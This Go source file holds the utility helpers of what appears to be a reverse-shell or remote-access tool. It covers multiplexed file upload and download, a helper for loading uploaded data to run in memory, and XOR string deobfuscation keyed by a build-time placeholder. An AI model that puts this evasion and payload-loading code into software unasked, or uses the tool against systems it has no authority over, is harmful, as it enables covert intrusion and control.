package utils

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	mr "math/rand"
	"net"
	"os"
	"strings"

	"github.com/hashicorp/yamux"
)

// Forward is the port forwarding struct
type Forward struct {
	LPort  string
	RPort  string
	Addr   string
	Quit   chan bool // quit "signal", sets active to false
	Local  bool
	Active bool
}

var key = "§key§"
var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

// Exists ...
func Exists(name string) bool {
	_, err := os.Stat(name)
	return !os.IsNotExist(err)
}

// RandSeq ...
func RandSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[mr.Intn(len(letters))]
	}
	return string(b)
}

// SplitAddress splits ipv4 or ipv6 address in port and ip part
func SplitAddress(addr string) (string, string) {
	ip := ""
	port := ""
	if strings.Contains(addr, "[") {
		// ipv6
		s := strings.Split(addr, "]")
		ip = s[0] + "]"
		port = strings.TrimLeft(s[1], ":")
	} else {
		// ipv4
		s := strings.Split(addr, ":")
		ip = s[0]
		port = s[1]
	}
	return ip, port
}

// Save base64 encoded file to disk
func Save(dst string, data string) bool {
	raw, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		log.Println(err)
		return false
	}
	err = ioutil.WriteFile(dst, raw, 0644)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

// SaveRaw ...
func SaveRaw(dst string, data string) bool {
	err := ioutil.WriteFile(dst, []byte(data), 0644)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

// Load file from disk and return base64 encoded representation
func Load(src string) (string, bool) {
	data, err := ioutil.ReadFile(src)
	if err != nil {
		log.Println(err)
		return "", false
	}
	b64 := base64.StdEncoding.EncodeToString(data)
	return b64, true
}

// LoadRaw ...
func LoadRaw(src string) ([]byte, bool) {
	data, err := ioutil.ReadFile(src)
	if err != nil {
		log.Println(err)
		return nil, false
	}
	return data, true
}

// CopyFile copies a file from a source path to a destination path
func CopyFile(src string, dst string) {
	// Read all content of src to data
	data, err := ioutil.ReadFile(src)
	if err != nil {
		log.Println(err)
	}
	// Write data to dst
	err = ioutil.WriteFile(dst, data, 0644)
	if err != nil {
		log.Println(err)
	}
}

// CopyIO copies data between a io.reader and a io.writer
func CopyIO(src, dest net.Conn) {
	defer src.Close()
	defer dest.Close()
	io.Copy(src, dest)
}

// UploadConnectRaw is used when the upload does not get stored in a file and is just used for in memory execution
func UploadConnectRaw(s *yamux.Session) ([]byte, error) {
	stream, err := s.Open()
	if err != nil {
		return nil, err
	}
	defer stream.Close()
	line, err := ioutil.ReadAll(stream)
	if err != nil {
		return nil, err
	}
	raw, err := base64.StdEncoding.DecodeString(string(line))
	if err != nil {
		log.Println(err)
		return nil, err
	}
	return raw, nil
}

// UploadConnect reads data from the network (b64 encoded) and writes it to a file
func UploadConnect(dst string, s *yamux.Session) {
	stream, err := s.Open()
	if err != nil {
		log.Println(err)
		return
	}
	defer stream.Close()
	line, err := ioutil.ReadAll(stream)
	if err != nil {
		log.Println(err)
		return
	}
	Save(dst, string(line))
}

// DownloadConnect reads data from a local file and sends it to the network (b64 encoded)
func DownloadConnect(src string, s *yamux.Session) {
	stream, err := s.Open()
	if err != nil {
		log.Println(err)
		return
	}
	defer stream.Close()
	content, _ := Load(src)
	stream.Write([]byte(fmt.Sprintf("%s\r\n", content)))
}

// UploadListen listens on the server/listener side and sends out a local file (b64 encoded) when the next multiplexed connection attempt happens
func UploadListen(src string, s *yamux.Session) {
	stream, err := s.Accept()
	if err != nil {
		log.Println(err)
		return
	}
	defer stream.Close()
	content, _ := Load(src)
	stream.Write([]byte(fmt.Sprintf("%s\r\n", content)))
}

// DownloadListen listens on the server/listener side and accepts a remote file (b64 encoded) when the next multiplexed connection attempt happens
func DownloadListen(dst string, s *yamux.Session) {
	stream, err := s.Accept()
	if err != nil {
		log.Println(err)
		return
	}
	defer stream.Close()
	line, err := ioutil.ReadAll(stream)
	if err != nil {
		log.Println(err)
		return
	}
	Save(dst, string(line))
}

// ByteToHex ...
func ByteToHex(s []byte) string {
	d := make([]byte, hex.DecodedLen(len(s)))
	n, err := hex.Decode(d, s)
	if err != nil {
		fmt.Println(err)
	}
	return fmt.Sprintf("%s", d[:n])
}

func Bake(cipher string) string {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	k, _ := hex.DecodeString(key)
	baked := ""
	for i := 0; i < len(tmp); i++ {
		baked += string(tmp[i] ^ k[i%len(k)])
	}
	return baked
}

func BBake(cipher string) []byte {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	k, _ := hex.DecodeString(key)
	baked := make([]byte, hex.DecodedLen(len(tmp)))
	for i := 0; i < len(tmp)-1; i++ {
		baked[i] = tmp[i] ^ k[i%len(k)]
	}
	return baked
}

// RemoveIndex ...
func RemoveIndex(s []int, index int) []int {
	return append(s[:index], s[index+1:]...)
}
